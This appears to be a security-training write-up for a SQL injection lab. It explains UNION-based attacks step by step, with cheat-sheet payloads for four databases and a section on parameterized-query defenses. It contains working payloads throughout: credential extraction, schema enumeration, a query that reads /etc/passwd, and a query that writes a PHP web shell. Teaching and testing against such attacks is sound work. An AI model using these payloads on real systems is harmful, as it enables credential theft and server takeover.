# Lab 5: SQL Injection UNION Attack — Retrieving Data from Other Tables

## Objective
Use `UNION` to extract `username` and `password` from the `users` table.

---

## Core Concept

A UNION-based SQL injection attack exploits the **UNION operator** in SQL to append arbitrary query results to a legitimate query. The attacker extends the original query to pull data from entirely different tables.

### Original Query (Vulnerable Application)

```sql
SELECT name, description FROM products WHERE category = 'Gifts'
```

### The Injection

```sql
' UNION SELECT username, password FROM users-- 
```

### Transformed Query

```sql
SELECT name, description FROM products WHERE category = 'Gifts' 
UNION SELECT username, password FROM users-- '
```

**What happens:**
1. The single quote (`'`) closes the string literal `'Gifts'`
2. `UNION SELECT username, password FROM users` appends a second query
3. `-- ` comments out the trailing quote and any other SQL
4. The database executes **both** queries and returns **both** result sets as one unified table

---

## Why UNION Requires Strict Rules

SQL's `UNION` operator has two non-negotiable requirements:

| Requirement | Why It Matters | How We Satisfy It |
|-------------|--------------|-------------------|
| **Same column count** | Both SELECT statements must return the same number of columns | Use `ORDER BY` or `UNION SELECT NULL,NULL...` to determine count |
| **Compatible data types** | Corresponding columns must have compatible types (or the DB must implicitly cast) | Test each column with string literals (`'a'`) to find text-capable positions |

---

## Phase 1: Reconnaissance

### Determining Column Count

**Method A: ORDER BY (Error-Based)**

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--  ← Error here = 3 columns exist
```

**Method B: UNION SELECT NULL (Blind/Confirmatory)**

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--  ← Success = 3 columns
```

> **Pro tip:** Use `NULL` because `NULL` is compatible with **every** data type in SQL. It won't trigger type-mismatch errors while you're just counting columns.

### Identifying Text-Capable Columns

Once you know there are 3 columns, test each position:

```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

If the page renders the letter **"a"** in a product field, that column position can hold string data and will display your extracted data.

---

## Phase 2: Database Enumeration

### The Information Schema

Databases store their own structure in **system catalogs** (metadata tables).

#### MySQL / MariaDB

```sql
' UNION SELECT NULL,table_name,column_name 
FROM information_schema.columns 
WHERE table_schema=database()--
```

- `information_schema.columns` — contains all columns in all tables
- `table_schema=database()` — restricts to current database
- Returns: `table_name | column_name` pairs

**To get all tables first:**

```sql
' UNION SELECT NULL,table_name,NULL 
FROM information_schema.tables 
WHERE table_schema=database()--
```

#### PostgreSQL

```sql
' UNION SELECT NULL,table_name,column_name 
FROM information_schema.columns 
WHERE table_schema='public'--
```

- PostgreSQL defaults user tables to the `public` schema
- System tables live in `pg_catalog` and `information_schema`

#### Oracle

```sql
' UNION SELECT NULL,table_name,column_name 
FROM all_tab_columns--
```

- Oracle uses `all_tab_columns` (or `user_tab_columns` for owned objects)
- **Critical Oracle quirk:** Every SELECT **must** have a `FROM` clause. If you need fewer columns, use `FROM DUAL`:
  ```sql
  ' UNION SELECT 'a','b' FROM DUAL--
  ```

#### Microsoft SQL Server

```sql
' UNION SELECT NULL,table_name,column_name 
FROM information_schema.columns--
```

- Or use SQL Server-specific system views:
  ```sql
  ' UNION SELECT NULL,name,NULL FROM syscolumns--
  ```

---

## Phase 3: Data Extraction

### Basic Credential Harvesting

With 2 text-capable columns identified:

```sql
' UNION SELECT username,password FROM users--
```

### Handling Hash Concatenation

If you have **one** text column but need two values, concatenate:

**MySQL/PostgreSQL:**
```sql
' UNION SELECT CONCAT(username,':',password),NULL FROM users--
```

**Oracle:**
```sql
' UNION SELECT username||':'||password,NULL FROM users--
```

**SQL Server:**
```sql
' UNION SELECT username+':'+password,NULL FROM users--
```

### Limiting Results

**MySQL:**
```sql
' UNION SELECT username,password FROM users LIMIT 5--
```

**PostgreSQL:**
```sql
' UNION SELECT username,password FROM users LIMIT 5--
```

**Oracle:**
```sql
' UNION SELECT username,password FROM users WHERE ROWNUM <= 5--
```

**SQL Server:**
```sql
' UNION SELECT TOP 5 username,password FROM users--
```

---

## Advanced Techniques

### 1. Conditional Data Extraction (Boolean-Based UNION)

When UNION output isn't directly visible, use conditional logic:

```sql
' UNION SELECT NULL,CASE WHEN (1=1) THEN 'yes' ELSE 'no' END,NULL--
```

If the page shows "yes", the condition executed. This bridges into **blind SQL injection** territory.

### 2. Extracting Multiple Rows with GROUP_CONCAT

**MySQL** — Combine all results into one row to fit limited columns:

```sql
' UNION SELECT NULL,GROUP_CONCAT(username,':',password SEPARATOR '|'),NULL 
FROM users--
```

**PostgreSQL:**
```sql
' UNION SELECT NULL,string_agg(username||':'||password,'|'),NULL 
FROM users--
```

**Oracle:**
```sql
' UNION SELECT NULL,LISTAGG(username||':'||password,'|') 
WITHIN GROUP (ORDER BY username),NULL FROM users--
```

### 3. Reading Files (MySQL — if `FILE` privilege exists)

```sql
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--
```

### 4. Writing Files (MySQL — RCE potential)

```sql
' UNION SELECT NULL,"<?php system($_GET['cmd']); ?>" 
INTO OUTFILE '/var/www/html/shell.php'--
```

---

## Database-Specific Cheat Sheet

| Task | MySQL | PostgreSQL | Oracle | SQL Server |
|------|-------|------------|--------|------------|
| **Comment** | `-- ` or `#` | `-- ` | `-- ` | `-- ` |
| **Current DB** | `database()` | `current_database()` | `SYS_CONTEXT('USERENV','CURRENT_SCHEMA')` | `DB_NAME()` |
| **Version** | `@@version` | `version()` | `banner FROM v$version` | `@@VERSION` |
| **String concat** | `CONCAT(a,b)` | `a\|\|b` | `a\|\|b` | `a+b` |
| **Substring** | `SUBSTRING()` | `SUBSTRING()` | `SUBSTR()` | `SUBSTRING()` |
| **Limit rows** | `LIMIT n` | `LIMIT n` | `ROWNUM <= n` | `TOP n` |
| **No-table SELECT** | `SELECT 1` | `SELECT 1` | `SELECT 1 FROM DUAL` | `SELECT 1` |
| **Sleep/Delay** | `SLEEP(5)` | `pg_sleep(5)` | `DBMS_LOCK.SLEEP(5)` | `WAITFOR DELAY '0:0:5'` |

---

## Why This Works: The Query Transformation

```
Original Query Structure:
┌─────────────────────────────────────────────────┐
│ SELECT col1, col2 FROM products WHERE cat = '  │
│ Gifts'                                          │
└─────────────────────────────────────────────────┘

Attacker Input:
' UNION SELECT username,password FROM users-- 

Resulting Query:
┌─────────────────────────────────────────────────┐
│ SELECT col1, col2 FROM products WHERE cat = '  │
│ Gifts' UNION SELECT username,password FROM      │
│ users-- '                                       │
└─────────────────────────────────────────────────┘

Execution Flow:
1. Parser sees: ...WHERE cat = 'Gifts'
2. Then sees: UNION (legal operator)
3. Then sees: SELECT username,password FROM users (legal subquery)
4. Then sees: -- (comment, ignores trailing quote)
5. Database unions both result sets
6. Application renders everything as "products"
```

---

## Critical Thinking: Defense Layers

| Defense | How It Stops UNION Injection |
|---------|------------------------------|
| **Parameterized Queries (Prepared Statements)** | User input is bound as **data values**, never parsed as SQL. The query structure is fixed before input arrives. |
| **Input Validation/Whitelisting** | Rejects quotes, `UNION`, `SELECT`, and other SQL keywords in input fields. |
| **Least Privilege DB User** | Even if injected, the DB account can't access `information_schema` or the `users` table. |
| **WAF (Web Application Firewall)** | Pattern-matches known SQL injection signatures and blocks requests. |
| **Stored Procedures** | (If implemented safely) separates code from data, though dynamic SQL inside procedures can still be vulnerable. |

### The Gold Standard: Parameterized Query

**Vulnerable (string concatenation):**
```python
query = "SELECT * FROM products WHERE category = '" + user_input + "'"
```

**Secure (parameterized):**
```python
query = "SELECT * FROM products WHERE category = ?"
cursor.execute(query, (user_input,))
```

The `?` placeholder ensures `user_input` is treated **only** as a string value, regardless of quotes or SQL keywords inside it.

---

## Practical Lab Walkthrough (PortSwigger Context)

1. **Determine columns:** `' ORDER BY 1--` through `' ORDER BY 3--` (error at 3 = 2 columns)
2. **Find text column:** `' UNION SELECT 'a',NULL--` and `' UNION SELECT NULL,'a'--`
3. **Confirm table exists:** `' UNION SELECT NULL,table_name FROM information_schema.tables--` (look for `users`)
4. **Extract data:** `' UNION SELECT username,password FROM users--`
5. **Log in** as the administrator using the stolen credentials

---

## Ethical Boundary

This technique is **only** legal and ethical when:
- You have **explicit written authorization** (penetration testing contract)
- You're attacking **your own** systems
- You're in a **designated training environment** (PortSwigger, Hack The Box, DVWA, etc.)

Unauthorized SQL injection violates computer fraud laws globally and carries severe penalties.
